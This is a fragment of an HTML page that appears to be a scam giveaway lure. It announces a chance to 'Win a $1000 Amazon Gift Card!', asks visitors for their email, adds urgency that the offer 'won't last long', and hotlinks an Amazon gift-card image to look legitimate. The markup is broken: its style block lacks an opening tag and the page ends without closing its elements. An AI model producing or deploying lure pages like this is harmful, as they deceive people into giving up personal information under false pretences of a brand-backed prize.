<!DOCTYPE html>
<html lang="en">
<head>

    body {
      font-family: 'Poppins', sans-serif;
      background-color: #eef5f8;

      padding: 0;

    }
    .topbar {
      background-color: #002742;
      color: #fff;
      padding: 16px;
      font-size: 22px;
      font-weight: 600;
    }
    .card {
      max-width: 500px;
      margin: 20px auto;
      background: white;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
    }
    h1 {
      color: #e48c00;
      margin-bottom: 12px;
    }
    p {
      font-size: 16px;
      margin-bottom: 20px;
      color: #333;
    }
    img {
      max-width: 100%;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    iframe {
      width: 100%;
      height: 270px;
      border: none;
      border-radius: 8px;
    }
    footer {
      font-size: 14px;
      color: #666;
      padding: 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="topbar">Limited‑Time Giveaway</div>

  <div class="card">
    <h1>Win a $1000 Amazon Gift Card!</h1>
    <p>Enter your email below and claim your chance. This offer won't last long!</p>
    <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card">

</html>
